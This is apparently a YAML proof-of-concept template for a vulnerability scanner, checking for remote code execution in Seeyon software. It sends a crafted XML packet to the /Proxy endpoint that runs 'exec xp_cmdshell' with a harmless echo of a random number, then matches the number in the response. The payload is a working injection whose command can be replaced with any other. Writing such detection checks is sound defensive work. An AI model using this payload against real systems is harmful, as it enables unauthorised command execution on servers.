name: poc-yaml-seeyon-rce
set:
  r1: randomInt(800000000, 1000000000)
rules:
  - method: POST
    path: /Proxy
    follow_redirects: false
    body: |
      cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell 'echo {{r1}}'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
    expression: |
      response.status == 200 && response.body.bcontains(bytes("output=" + "\"" + string(r1)))
detail:
  author: MrP01ntSun(https://github.com/MrPointSun)
  links:
    - https://www.hackbug.net/archives/111.html
